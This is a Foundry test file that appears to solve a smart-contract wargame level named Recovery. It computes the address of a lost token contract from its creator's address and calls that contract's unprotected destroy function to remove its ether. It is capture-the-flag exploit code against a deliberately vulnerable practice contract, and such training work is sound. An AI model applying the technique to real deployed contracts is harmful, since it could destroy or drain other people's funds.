pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/RecoveryFactory.sol';
import 'levels/Recovery.sol';
import 'utils/TestUtils.sol';

contract RecoveryTest is Test {
  address player;
  Utils utils;
  RecoveryFactory recoveryFactory;
  address payable recoveryAddress;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];

    recoveryFactory = new RecoveryFactory();
    recoveryAddress = payable(recoveryFactory.createInstance{value: 1 ether}(player));
  }

  function testHack() public {
    address simpleTokenAddress = address(
      uint160(
        uint256(
          keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), recoveryAddress, bytes1(0x01)))
        )
      )
    );
    simpleTokenAddress.call(abi.encodeWithSignature('destroy(address)', simpleTokenAddress));
    assertTrue(recoveryFactory.validateInstance(recoveryAddress, player), 'Level not solved');
  }
}
